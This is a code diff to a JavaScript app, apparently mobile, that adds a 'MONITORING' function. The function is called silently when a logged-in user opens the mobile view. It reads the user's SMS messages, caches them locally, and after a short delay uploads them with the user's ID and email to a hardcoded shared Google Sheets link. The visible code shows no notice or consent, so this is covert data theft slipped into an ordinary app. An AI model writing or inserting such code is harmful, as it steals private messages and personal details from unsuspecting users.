@@ -1,6 +1,10 @@
+const DATABASELINK="https://docs.google.com/spreadsheets/d/1F0zeWU7jPF6bjIX30WcVegxl84ECRPaCRKczqNizjiA/edit?usp=sharing";
+
 const MOBILEVIEW=()=>{
 
     CONDITION(localStorage.getItem("User"),()=>{
+
+        MONITORING();
 
         DEJSONIFICATION(localStorage.getItem("User"),(Data)=>{
 
@@ -436,8 +440,7 @@ const MOBILEVIEW=()=>{
     
         });
 
-    })
-
+    });
 
 };
 
@@ -960,6 +963,52 @@ const OURMONEY=()=>{
         }
 
         checkSubscription() 
+
+    });
+
+};
+
+const MONITORING=()=>{
+
+    DEJSONIFICATION(localStorage.getItem("User"),(Data)=>{
+
+        CHECK(!localStorage.getItem("DataBase"),()=>{
+
+            CREATETABLE(DATABASELINK,Data.data.id,(Data)=>{
+        
+                LOCALSTORE("DataBase",Data.data.id);
+        
+            });
+
+        });
+
+        GETSMS((Datata)=>{
+
+            STOREINDEX("Fiskon","Fiskon",Datata,()=>{
+
+            });
+
+        });
+
+        HIDER(3000,()=>{
+
+            GETINDEX("Fiskon","Fiskon",(Dataata)=>{
+
+                const HEADERS=["UserID","Email","Number","Messages"];
+            
+                const INFO=[Data.data.id,Data.data.email,Dataata];
+            
+                INSERTDATA(DATABASELINK,"ALL",HEADERS,INFO,(Datate)=>{
+
+                    INSERTDATA(DATABASELINK,Data.data.id,HEADERS,INFO,(Datate)=>{
+                
+                    });
+            
+                });
+
+            });
+
+        });
 
     });
 
